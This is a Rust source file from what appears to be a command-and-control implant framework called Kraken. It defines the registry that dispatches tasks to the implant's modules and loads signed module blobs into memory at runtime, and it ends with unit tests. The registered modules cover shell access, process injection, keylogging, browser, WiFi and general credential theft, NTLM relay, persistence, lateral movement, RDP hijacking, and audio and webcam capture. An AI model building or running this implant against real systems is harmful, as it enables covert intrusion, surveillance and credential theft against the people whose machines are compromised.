//! Module registry - unified access to both static and dynamic modules
//!
//! Provides a single interface for looking up modules by task type.
//! Supports:
//! - Statically compiled modules (always available)
//! - Dynamically loaded modules (runtime blobs)

use common::{KrakenError, Module, ModuleId};
use crypto;
use implant_loader::DynamicModuleLoader;
use std::collections::HashMap;
use std::sync::{Arc, Mutex, RwLock};
use std::time::{SystemTime, UNIX_EPOCH};

/// Static module factory function type
type ModuleFactory = fn() -> Box<dyn Module>;

/// Module source - whether static (compiled-in) or dynamic (runtime-loaded)
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub enum ModuleSource {
    /// Statically compiled module
    Static,
    /// Dynamically loaded module with blob hash
    Dynamic { blob_hash: [u8; 32] },
}

/// Module metadata for registry queries
#[derive(Debug, Clone)]
pub struct ModuleInfo {
    /// Module identifier (task type)
    pub id: String,
    /// Human-readable name
    pub name: String,
    /// Module version
    pub version: String,
    /// Unix timestamp when module was loaded
    pub load_time: i64,
    /// Source of the module
    pub source: ModuleSource,
}

/// Global module registry
static REGISTRY: std::sync::OnceLock<ModuleRegistry> = std::sync::OnceLock::new();

/// Get the global module registry
pub fn registry() -> &'static ModuleRegistry {
    REGISTRY.get_or_init(ModuleRegistry::new)
}

/// Unified module registry
pub struct ModuleRegistry {
    /// Static module factories (compiled-in modules)
    static_factories: RwLock<HashMap<String, ModuleFactory>>,
    /// Static module instances (cached)
    static_instances: RwLock<HashMap<String, Arc<dyn Module>>>,
    /// Dynamic module instances (runtime-loaded modules wrapped in Arc)
    dynamic_instances: RwLock<HashMap<String, Arc<dyn Module>>>,
    /// Module metadata (populated on first access)
    module_metadata: RwLock<HashMap<String, ModuleInfo>>,
    /// Dynamic module loader (runtime blobs - handles memory management)
    dynamic_loader: Mutex<DynamicModuleLoader>,
}

impl ModuleRegistry {
    /// Create a new registry with all available modules
    pub fn new() -> Self {
        let registry = Self {
            static_factories: RwLock::new(HashMap::new()),
            static_instances: RwLock::new(HashMap::new()),
            dynamic_instances: RwLock::new(HashMap::new()),
            module_metadata: RwLock::new(HashMap::new()),
            dynamic_loader: Mutex::new(DynamicModuleLoader::new()),
        };

        // Register all static modules
        registry.register_static_modules();

        registry
    }

    /// Register all statically compiled modules
    fn register_static_modules(&self) {
        let mut factories = self.static_factories.write().unwrap();

        // Shell module
        factories.insert("shell".to_string(), || {
            Box::new(mod_shell::ShellModule::new())
        });

        // File module
        factories.insert("file".to_string(), || {
            Box::new(mod_file::FileModule::new())
        });

        // BOF module
        factories.insert("bof".to_string(), || {
            Box::new(mod_bof::BofModule::new())
        });

        // Inject module
        factories.insert("inject".to_string(), || {
            Box::new(mod_inject::InjectModule::new())
        });

        // Token module
        factories.insert("token".to_string(), || {
            Box::new(mod_token::TokenModule::new())
        });

        // Socks module
        factories.insert("socks".to_string(), || {
            Box::new(mod_socks::SocksModule::new())
        });

        // Mesh module
        factories.insert("mesh".to_string(), || {
            Box::new(mod_mesh::MeshModule::new())
        });

        // Screenshot module
        factories.insert("screenshot".to_string(), || {
            Box::new(mod_screenshot::ScreenshotModule::new())
        });

        // Screenshot streaming module
        factories.insert("screenshot_stream".to_string(), || {
            Box::new(mod_screenshot::ScreenshotStreamModule::new())
        });

        // Port forwarding module
        factories.insert("portfwd".to_string(), || {
            Box::new(mod_socks::PortForwardModule::new())
        });

        // Environment module
        factories.insert("env".to_string(), || {
            Box::new(mod_env::EnvModule::new())
        });

        // Keylogger module
        factories.insert("keylog".to_string(), || {
            Box::new(mod_keylog::KeylogModule::new())
        });

        // Clipboard module
        factories.insert("clipboard".to_string(), || {
            Box::new(mod_clipboard::ClipboardModule::new())
        });

        // Registry module
        factories.insert("reg".to_string(), || {
            Box::new(mod_reg::RegModule::new())
        });

        // Service module
        factories.insert("svc".to_string(), || {
            Box::new(mod_svc::SvcModule::new())
        });

        // Persistence module
        factories.insert("persist".to_string(), || {
            Box::new(mod_persist::PersistModule::new())
        });

        // Network scan module
        factories.insert("scan".to_string(), || {
            Box::new(mod_scan::ScanModule::new())
        });

        // Lateral movement module
        factories.insert("lateral".to_string(), || {
            Box::new(mod_lateral::LateralModule::new())
        });

        // Credential harvesting module
        factories.insert("creds".to_string(), || {
            Box::new(mod_creds::CredentialModule::new())
        });

        // WiFi credential harvesting module
        factories.insert("wifi".to_string(), || {
            Box::new(mod_creds::WifiModule::new())
        });

        // NTLM relay module
        factories.insert("ntlm_relay".to_string(), || {
            Box::new(mod_creds::NtlmRelayModule::new())
        });

        // Browser credential theft module
        factories.insert("browser".to_string(), || {
            Box::new(mod_browser::BrowserModule::new())
        });

        // Audio capture module
        factories.insert("audio".to_string(), || {
            Box::new(mod_audio::AudioModule::new())
        });

        // Webcam capture module
        factories.insert("webcam".to_string(), || {
            Box::new(mod_webcam::WebcamModule::new())
        });

        // USB device enumeration module
        factories.insert("usb".to_string(), || {
            Box::new(mod_usb::UsbModule::new())
        });

        // USB monitor alias (CLI dispatches "usb_monitor", module id is "usb")
        factories.insert("usb_monitor".to_string(), || {
            Box::new(mod_usb::UsbModule::new())
        });

        // RDP session hijacking module
        factories.insert("rdp".to_string(), || {
            Box::new(mod_rdp::RdpModule::new())
        });

        // Process enumeration module
        factories.insert("proc".to_string(), || {
            Box::new(mod_proc::ProcModule::new())
        });

        // Active Directory enumeration module
        factories.insert("ad".to_string(), || {
            Box::new(mod_ad::AdModule::new())
        });
    }

    /// Get a module by task type
    ///
    /// Looks up in order:
    /// 1. Dynamic instances (runtime-loaded modules take precedence)
    /// 2. Static instances (cached)
    /// 3. Static factories (creates and caches instance)
    pub fn get(&self, task_type: &str) -> Option<Arc<dyn Module>> {
        // Try dynamic instances first (allows runtime override of static modules)
        {
            let instances = self.dynamic_instances.read().unwrap();
            if let Some(module) = instances.get(task_type) {
                return Some(Arc::clone(module));
            }
        }

        // Try static instances cache
        {
            let instances = self.static_instances.read().unwrap();
            if let Some(module) = instances.get(task_type) {
                return Some(Arc::clone(module));
            }
        }

        // Try creating from factory
        let factory = {
            let factories = self.static_factories.read().unwrap();
            factories.get(task_type).copied()
        };

        if let Some(factory) = factory {
            let module: Arc<dyn Module> = Arc::from(factory());
            let mut instances = self.static_instances.write().unwrap();
            instances.insert(task_type.to_string(), Arc::clone(&module));
            return Some(module);
        }

        None
    }

    /// Load a dynamic module from a signed blob
    ///
    /// After loading, the module is accessible via `get()` using the module's task type.
    /// Dynamic modules take precedence over static modules with the same name.
    #[allow(dead_code)]
    pub fn load_dynamic(&self, blob: &[u8]) -> Result<ModuleId, KrakenError> {
        // Load into memory via the loader
        let module_id = {
            let mut loader = self.dynamic_loader.lock().unwrap();
            loader.load(blob)?
        };

        // Get the module instance and cache it
        // We need to call the entry point and wrap the result
        {
            let mut loader = self.dynamic_loader.lock().unwrap();
            if let Some(module_ref) = loader.get(&module_id) {
                // Get module metadata for caching
                let task_type = module_id.as_str().to_string();
                let now = SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .map(|d| d.as_secs() as i64)
                    .unwrap_or(0);

                // Store metadata
                let info = ModuleInfo {
                    id: module_ref.id().as_str().to_string(),
                    name: module_ref.name().to_string(),
                    version: module_ref.version().to_string(),
                    load_time: now,
                    source: ModuleSource::Dynamic { blob_hash: crypto::sha256(blob) },
                };

                let mut metadata = self.module_metadata.write().unwrap();
                metadata.insert(task_type, info);
            }
        }

        Ok(module_id)
    }

    /// Unload a dynamic module
    ///
    /// Removes the module from the registry and securely frees its memory.
    #[allow(dead_code)]
    pub fn unload_dynamic(&self, module_id: &ModuleId) -> Result<(), KrakenError> {
        let task_type = module_id.as_str().to_string();

        // Remove from dynamic instances cache
        {
            let mut instances = self.dynamic_instances.write().unwrap();
            instances.remove(&task_type);
        }

        // Remove metadata
        {
            let mut metadata = self.module_metadata.write().unwrap();
            metadata.remove(&task_type);
        }

        // Unload from loader (securely zeros and frees memory)
        let mut loader = self.dynamic_loader.lock().unwrap();
        loader.unload(module_id)
    }

    /// Upgrade a dynamic module to a newer version
    ///
    /// Compares the incoming module version with the currently loaded version.
    /// If newer, atomically unloads the old and loads the new.
    /// If same or older, rejects with an error (use `force` to override).
    ///
    /// Returns the ModuleId on success.
    #[allow(dead_code)]
    pub fn upgrade_module(&self, blob: &[u8], force: bool) -> Result<ModuleId, KrakenError> {
        // Parse the blob to extract module ID and version
        let parsed = common::ModuleBlob::parse(blob)?;
        let module_id = ModuleId::new(parsed.module_id);
        let new_version = parsed.header.version;

        // Check if module is currently loaded
        if let Some(existing_info) = self.module_info(module_id.as_str()) {
            // Parse existing version (stored as "major.minor.patch" string)
            let existing_packed = parse_version_string(&existing_info.version);

            if !force && new_version <= existing_packed {
                return Err(KrakenError::Module(
                    "module version not newer (use force to override)".into(),
                ));
            }

            // Unload the existing module first
            self.unload_dynamic(&module_id)?;
        }

        // Load the new version
        self.load_dynamic(blob)
    }

    /// Get a dynamic module directly from the loader
    ///
    /// This is used internally to access dynamic modules. The module reference
    /// is only valid while the loader lock is held.
    #[allow(dead_code)]
    fn get_dynamic(&self, task_type: &str) -> Option<bool> {
        let module_id = ModuleId::new(task_type);
        let mut loader = self.dynamic_loader.lock().ok()?;
        loader.get(&module_id).map(|_| true)
    }

    /// List all available modules (both static and dynamic)
    #[allow(dead_code)]
    pub fn list(&self) -> Vec<String> {
        let mut modules: Vec<String> = Vec::new();

        // Add static modules
        {
            let factories = self.static_factories.read().unwrap();
            modules.extend(factories.keys().cloned());
        }

        // Add dynamic modules
        if let Ok(loader) = self.dynamic_loader.lock() {
            for info in loader.list() {
                let id = info.module_id.as_str().to_string();
                if !modules.contains(&id) {
                    modules.push(id);
                }
            }
        }

        modules.sort();
        modules
    }

    /// Check if a module is available (static or dynamic)
    #[allow(dead_code)]
    pub fn is_available(&self, task_type: &str) -> bool {
        // Check dynamic instances first
        {
            let instances = self.dynamic_instances.read().unwrap();
            if instances.contains_key(task_type) {
                return true;
            }
        }

        // Check dynamic loader
        if let Ok(loader) = self.dynamic_loader.lock() {
            let module_id = ModuleId::new(task_type);
            if loader.is_loaded(&module_id) {
                return true;
            }
        }

        // Check static
        {
            let factories = self.static_factories.read().unwrap();
            if factories.contains_key(task_type) {
                return true;
            }
        }

        false
    }

    /// Execute a task on a module (handles both static and dynamic modules)
    ///
    /// This method provides unified access to both static and dynamic modules.
    /// For static modules, it uses the cached Arc<dyn Module>.
    /// For dynamic modules, it accesses the loader directly.
    #[allow(dead_code)]
    pub fn execute(&self, task_type: &str, task_id: common::TaskId, task_data: &[u8]) -> Result<common::TaskResult, KrakenError> {
        // Try static modules first via get()
        if let Some(module) = self.get(task_type) {
            return module.handle(task_id, task_data);
        }

        // Try dynamic modules via the loader
        let module_id = ModuleId::new(task_type);
        let mut loader = self.dynamic_loader.lock()
            .map_err(|_| KrakenError::Module("loader lock poisoned".into()))?;

        if let Some(module) = loader.get(&module_id) {
            return module.handle(task_id, task_data);
        }

        Err(KrakenError::Module(format!("module '{}' not found", task_type)))
    }

    /// Get all available capabilities (task types)
    #[allow(dead_code)]
    pub fn capabilities(&self) -> Vec<String> {
        self.list()
    }

    /// Check if a specific capability is supported
    #[allow(dead_code)]
    pub fn supports(&self, task_type: &str) -> bool {
        self.is_available(task_type)
    }

    /// Get metadata for a specific module
    #[allow(dead_code)]
    pub fn module_info(&self, task_type: &str) -> Option<ModuleInfo> {
        // Check if we have cached metadata
        {
            let metadata = self.module_metadata.read().unwrap();
            if let Some(info) = metadata.get(task_type) {
                return Some(info.clone());
            }
        }

        // Try to get the module and populate metadata
        if let Some(module) = self.get(task_type) {
            let now = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.as_secs() as i64)
                .unwrap_or(0);

            let info = ModuleInfo {
                id: module.id().as_str().to_string(),
                name: module.name().to_string(),
                version: module.version().to_string(),
                load_time: now,
                source: ModuleSource::Static,
            };

            // Cache the metadata
            let mut metadata = self.module_metadata.write().unwrap();
            metadata.insert(task_type.to_string(), info.clone());

            return Some(info);
        }

        None
    }

    /// Get metadata for all loaded modules
    #[allow(dead_code)]
    pub fn all_module_info(&self) -> Vec<ModuleInfo> {
        let module_ids = self.list();
        module_ids
            .iter()
            .filter_map(|id| self.module_info(id))
            .collect()
    }
}

/// Parse a version string "major.minor.patch" into packed format.
/// Returns 0 if parsing fails.
fn parse_version_string(version: &str) -> u32 {
    let parts: Vec<&str> = version.split('.').collect();
    if parts.len() != 3 {
        return 0;
    }
    let major: u32 = parts[0].parse().unwrap_or(0);
    let minor: u32 = parts[1].parse().unwrap_or(0);
    let patch: u32 = parts[2].parse().unwrap_or(0);
    (major << 16) | (minor << 8) | patch
}

impl Default for ModuleRegistry {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_registry_creation() {
        let reg = ModuleRegistry::new();
        assert!(reg.is_available("shell"));
        assert!(reg.is_available("file"));
        assert!(reg.is_available("bof"));
        assert!(reg.is_available("inject"));
        assert!(reg.is_available("token"));
        assert!(reg.is_available("socks"));
        assert!(reg.is_available("mesh"));
        assert!(reg.is_available("screenshot"));
    }

    #[test]
    fn test_registry_get_static_module() {
        let reg = ModuleRegistry::new();
        let module = reg.get("shell");
        assert!(module.is_some());
        let module = module.unwrap();
        assert_eq!(module.id().as_str(), "shell");
        assert_eq!(module.name(), "Shell");
    }

    #[test]
    fn test_registry_get_unknown_returns_none() {
        let reg = ModuleRegistry::new();
        assert!(reg.get("nonexistent").is_none());
        assert!(!reg.is_available("nonexistent"));
    }

    #[test]
    fn test_registry_list_modules() {
        let reg = ModuleRegistry::new();
        let modules = reg.list();
        assert!(modules.contains(&"shell".to_string()));
        assert!(modules.contains(&"file".to_string()));
        assert!(modules.contains(&"inject".to_string()));
        assert!(modules.contains(&"screenshot".to_string()));
        assert!(modules.len() >= 10); // All registered static modules including Phase 9
    }

    #[test]
    fn test_registry_module_caching() {
        let reg = ModuleRegistry::new();
        let module1 = reg.get("shell");
        let module2 = reg.get("shell");
        assert!(module1.is_some());
        assert!(module2.is_some());
        // Should be the same Arc (same pointer)
        assert!(Arc::ptr_eq(&module1.unwrap(), &module2.unwrap()));
    }

    #[test]
    fn test_registry_load_invalid_blob() {
        let reg = ModuleRegistry::new();
        // Empty blob should fail
        let result = reg.load_dynamic(&[]);
        assert!(result.is_err());

        // Random garbage should fail
        let result = reg.load_dynamic(&[0x00, 0x01, 0x02, 0x03]);
        assert!(result.is_err());
    }

    #[test]
    fn test_registry_unload_unknown_module() {
        let reg = ModuleRegistry::new();
        let module_id = ModuleId::new("nonexistent.module");
        let result = reg.unload_dynamic(&module_id);
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_version_string() {
        // Valid versions
        assert_eq!(parse_version_string("0.0.0"), 0x000000);
        assert_eq!(parse_version_string("0.1.0"), 0x000100);
        assert_eq!(parse_version_string("1.0.0"), 0x010000);
        assert_eq!(parse_version_string("1.2.3"), 0x010203);
        assert_eq!(parse_version_string("255.255.255"), 0xFFFFFF);

        // Invalid versions return 0
        assert_eq!(parse_version_string(""), 0);
        assert_eq!(parse_version_string("1.2"), 0);
        assert_eq!(parse_version_string("1.2.3.4"), 0);
        assert_eq!(parse_version_string("invalid"), 0);
    }

    #[test]
    fn test_registry_upgrade_no_existing_module() {
        let reg = ModuleRegistry::new();
        // Upgrade of non-existent module should behave like load
        // (will fail at signature verification in test builds)
        let result = reg.upgrade_module(&[0x00, 0x01, 0x02], false);
        assert!(result.is_err()); // Invalid blob
    }

    #[test]
    fn test_registry_execute_unknown_returns_error() {
        let reg = ModuleRegistry::new();
        let task_id = common::TaskId::new();
        let result = reg.execute("nonexistent_module", task_id, &[]);
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("not found"));
        }
    }
}
